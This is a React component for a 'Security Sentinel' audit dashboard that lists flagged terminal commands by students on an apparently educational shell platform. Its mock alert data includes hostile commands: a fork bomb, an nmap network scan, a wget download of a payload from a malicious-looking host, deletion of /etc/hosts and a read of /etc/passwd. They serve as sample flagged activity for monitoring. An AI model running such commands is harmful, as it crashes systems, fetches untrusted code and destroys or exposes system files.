import React, { useState, useEffect } from 'react';
import { AlertOctagon, Trash, Shield, ShieldAlert, ShieldX } from 'lucide-react';
import { HeadlineText, MonoText, TextInput, PrimaryButton, LabelCapsText } from '../components/atoms';
import type { SecurityAlert } from '../types';
import { collection, getDocs, onSnapshot, query, orderBy, doc, writeBatch } from 'firebase/firestore';
import { db } from '../config/firebase';

const MOCK_ALERTS: SecurityAlert[] = [
  { id: 'al-01', timestamp: '14:24:12', command: 'sudo apt update', flagType: 'sudo', level: 'warn', studentEmail: 'john_doe@shellx.com' },
  { id: 'al-02', timestamp: '14:26:01', command: ':(){ :|:& };:', flagType: 'fork_bomb', level: 'critical', studentEmail: 'alex_m@shellx.com' },
  { id: 'al-03', timestamp: '14:28:44', command: 'nmap -sP 192.168.1.0/24', flagType: 'port_scan', level: 'critical', studentEmail: 'mike_r@shellx.com' },
  { id: 'al-04', timestamp: '14:30:15', command: 'wget http://malicious.ru/payload.sh', flagType: 'malicious_script', level: 'warn', studentEmail: 'lucas_s@shellx.com' },
  { id: 'al-05', timestamp: '14:32:00', command: 'sudo rm -rf /etc/hosts', flagType: 'sudo', level: 'critical', studentEmail: 'sarah_c@shellx.com' },
  { id: 'al-06', timestamp: '14:33:10', command: 'cat /etc/passwd', flagType: 'malicious_script', level: 'info', studentEmail: 'emma_w@shellx.com' },
];

export const AuditsScreen: React.FC = () => {
  const [alerts, setAlerts] = useState<SecurityAlert[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [keywordFilter, setKeywordFilter] = useState('');
  const [levelFilter, setLevelFilter] = useState<'all' | 'info' | 'warn' | 'critical'>('all');

  // Subscribe to security alerts in Firestore
  useEffect(() => {
    const alertsCol = collection(db, 'securityAlerts');
    const q = query(alertsCol, orderBy('timestamp', 'desc'));
    
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const list: SecurityAlert[] = snapshot.docs.map(uDoc => {
        const data = uDoc.data() as {
          timestamp?: string | { toDate: () => Date };
          command?: string;
          flagType?: SecurityAlert['flagType'];
          level?: SecurityAlert['level'];
          studentEmail?: string;
        };
        
        let timeStr = 'N/A';
        if (data.timestamp) {
          if (typeof data.timestamp === 'string') {
            timeStr = data.timestamp;
          } else if (typeof data.timestamp.toDate === 'function') {
            timeStr = data.timestamp.toDate().toLocaleTimeString();
          }
        }
        
        return {
          id: uDoc.id,
          timestamp: timeStr,
          command: data.command || '',
          flagType: data.flagType || 'sudo',
          level: data.level || 'info',
          studentEmail: data.studentEmail || 'student@shellx.com',
        };
      });
      
      if (list.length === 0) {
        setAlerts(MOCK_ALERTS);
      } else {
        setAlerts(list);
      }
      setIsLoading(false);
    }, (error) => {
      console.error('Error fetching security alerts:', error);
      setAlerts(MOCK_ALERTS);
      setIsLoading(false);
    });
    
    return () => unsubscribe();
  }, []);

  const filteredAlerts = alerts.filter((al) => {
    const matchesKeyword = al.command.toLowerCase().includes(keywordFilter.toLowerCase()) ||
                           al.studentEmail.toLowerCase().includes(keywordFilter.toLowerCase());
    const matchesLevel = levelFilter === 'all' || al.level === levelFilter;
    return matchesKeyword && matchesLevel;
  });

  const handleClearAlerts = async () => {
    if (!window.confirm('Are you sure you want to clear all security alerts in Firestore?')) return;
    try {
      const alertsCol = collection(db, 'securityAlerts');
      const snap = await getDocs(alertsCol);
      
      const batch = writeBatch(db);
      snap.docs.forEach(d => {
        batch.delete(doc(db, 'securityAlerts', d.id));
      });
      await batch.commit();
      
      setAlerts([]);
      alert('Security alerts logs successfully cleared in Firestore.');
    } catch (error) {
      const err = error as { message?: string };
      alert('Failed to clear logs: ' + (err.message || 'Unknown error'));
    }
  };

  const contentStyle: React.CSSProperties = {
    display: 'flex',
    flexDirection: 'column',
    gap: 'var(--spacing-lg)',
  };

  const filterCardStyle: React.CSSProperties = {
    display: 'flex',
    flexWrap: 'wrap',
    gap: 'var(--spacing-md)',
    alignItems: 'flex-end',
    backgroundColor: 'var(--color-background-elevated)',
    border: '1px solid var(--color-border-subtle)',
    borderRadius: 'var(--radius-lg)',
    padding: 'var(--spacing-md)',
  };

  const tableContainerStyle: React.CSSProperties = {
    backgroundColor: 'var(--color-background-elevated)',
    border: '1px solid var(--color-border-subtle)',
    borderRadius: 'var(--radius-lg)',
    overflow: 'hidden',
  };

  const tableStyle: React.CSSProperties = {
    width: '100%',
    borderCollapse: 'collapse',
    textAlign: 'left',
  };

  const thStyle: React.CSSProperties = {
    borderBottom: '1px solid var(--color-border-subtle)',
    padding: '16px var(--spacing-md)',
  };

  const tdStyle: React.CSSProperties = {
    borderBottom: '1px solid var(--color-border-subtle)',
    padding: '14px var(--spacing-md)',
    fontSize: '13px',
  };

  const alertBadgeStyle = (level: 'info' | 'warn' | 'critical'): React.CSSProperties => {
    let color = 'var(--color-text-secondary)';
    let bg = 'rgba(255,255,255,0.03)';
    let border = 'var(--color-border-subtle)';

    if (level === 'info') {
      color = 'var(--color-syntax-blue)';
      bg = 'rgba(173, 198, 255, 0.05)';
      border = '1px solid var(--color-border-focus)';
    } else if (level === 'warn') {
      color = 'var(--color-semantic-warning)';
      bg = 'rgba(245, 158, 11, 0.05)';
      border = '1px solid var(--color-semantic-warning)';
    } else if (level === 'critical') {
      color = 'var(--color-semantic-error)';
      bg = 'rgba(239, 68, 68, 0.05)';
      border = '1px solid var(--color-border-error)';
    }

    return {
      display: 'inline-flex',
      alignItems: 'center',
      gap: '4px',
      padding: '3px 8px',
      borderRadius: 'var(--radius-full)',
      fontSize: '10px',
      fontFamily: 'monospace',
      fontWeight: 'bold',
      backgroundColor: bg,
      color,
      border,
    };
  };

  const getAlertIcon = (level: 'info' | 'warn' | 'critical') => {
    if (level === 'info') return <Shield size={12} />;
    if (level === 'warn') return <ShieldAlert size={12} />;
    return <ShieldX size={12} />;
  };

  return (
    <div style={contentStyle}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: 'var(--spacing-md)' }}>
        <div>
          <HeadlineText level={1} style={{ marginBottom: '4px' }}>
            Security Sentinel
          </HeadlineText>
          <p style={{ margin: 0, fontSize: '13px', color: 'var(--color-text-secondary)' }}>
            Intercept blocked terminal keywords, view container restriction alerts, and inspect exit violations.
          </p>
        </div>
        
        <PrimaryButton 
          onClick={handleClearAlerts}
          disabled={alerts.length === 0}
          style={{ minHeight: '36px', fontSize: '11px', display: 'flex', alignItems: 'center', gap: '8px', padding: '6px 12px', backgroundColor: 'transparent', border: '1px solid var(--color-semantic-error)', color: 'var(--color-semantic-error)' }}
        >
          <Trash size={12} />
          <span>CLEAR ALERTS LOG</span>
        </PrimaryButton>
      </div>

      {/* Filter Row */}
      <div style={filterCardStyle}>
        <div style={{ flex: 1.5, minWidth: '220px' }}>
          <TextInput
            label="Filter Keyword"
            placeholder="Search by command syntax or student email..."
            value={keywordFilter}
            onChange={(e) => setKeywordFilter(e.target.value)}
          />
        </div>

        <div style={{ display: 'flex', flexDirection: 'column', gap: 'var(--spacing-xs)' }}>
          <label style={{
            fontSize: '11px',
            fontFamily: '"JetBrains Mono", ui-monospace, monospace',
            fontWeight: '600',
            textTransform: 'uppercase',
            color: 'var(--color-text-secondary)',
          }}>
            Severity Level
          </label>
          <select
            value={levelFilter}
            onChange={(e) => setLevelFilter(e.target.value as typeof levelFilter)}
            style={{
              minHeight: '44px',
              backgroundColor: 'var(--color-background-input)',
              border: '1px solid var(--color-border-subtle)',
              borderRadius: 'var(--radius-default)',
              color: 'var(--color-text-primary)',
              fontFamily: '"JetBrains Mono", ui-monospace, monospace',
              fontSize: '13px',
              padding: '0 12px',
              outline: 'none',
              cursor: 'pointer'
            }}
          >
            <option value="all">ALL ALERT SEVERITIES</option>
            <option value="info">INFO ONLY</option>
            <option value="warn">WARNING ALERTS</option>
            <option value="critical">CRITICAL VIOLATIONS</option>
          </select>
        </div>
      </div>

      {/* Alerts Logs Table */}
      <div style={tableContainerStyle}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}><LabelCapsText>Timestamp</LabelCapsText></th>
              <th style={thStyle}><LabelCapsText>Student Email</LabelCapsText></th>
              <th style={thStyle}><LabelCapsText>Severity</LabelCapsText></th>
              <th style={thStyle}><LabelCapsText>Flag Type</LabelCapsText></th>
              <th style={thStyle}><LabelCapsText>Command Attempted</LabelCapsText></th>
            </tr>
          </thead>
          <tbody>
            {isLoading ? (
              <tr>
                <td colSpan={5} style={{ ...tdStyle, textAlign: 'center', padding: 'var(--spacing-xl)', color: 'var(--color-text-tertiary)' }}>
                  <MonoText size="12px">[ LOADING SECURITY ALERTS... ]</MonoText>
                </td>
              </tr>
            ) : (
              filteredAlerts.map((al) => (
                <tr key={al.id}>
                  <td style={tdStyle}><MonoText size="12px" color="var(--color-text-tertiary)">{al.timestamp}</MonoText></td>
                  <td style={tdStyle}><MonoText size="13px" weight="bold">{al.studentEmail}</MonoText></td>
                  <td style={tdStyle}>
                    <span style={alertBadgeStyle(al.level)}>
                      {getAlertIcon(al.level)}
                      <span>{al.level.toUpperCase()}</span>
                    </span>
                  </td>
                  <td style={tdStyle}>
                    <LabelCapsText size="9px" color="var(--color-syntax-purple)">
                      {al.flagType.replace('_', ' ')}
                    </LabelCapsText>
                  </td>
                  <td style={tdStyle}>
                    <MonoText 
                      size="12px" 
                      color="var(--color-semantic-error)"
                      weight="bold"
                      style={{
                        backgroundColor: 'rgba(239, 68, 68, 0.02)',
                        border: '1px solid rgba(239, 68, 68, 0.1)',
                        padding: '4px 10px',
                        borderRadius: 'var(--radius-default)',
                        display: 'inline-block'
                      }}
                    >
                      {al.command}
                    </MonoText>
                  </td>
                </tr>
              ))
            )}
            {!isLoading && filteredAlerts.length === 0 && (
              <tr>
                <td colSpan={5} style={{ ...tdStyle, textAlign: 'center', padding: 'var(--spacing-xl)', color: 'var(--color-text-tertiary)' }}>
                  <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
                    <AlertOctagon size={24} color="var(--color-text-tertiary)" />
                    <span>[ NO SUSPICIOUS ACTIVITIES FLAGGED ]</span>
                  </div>
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
};
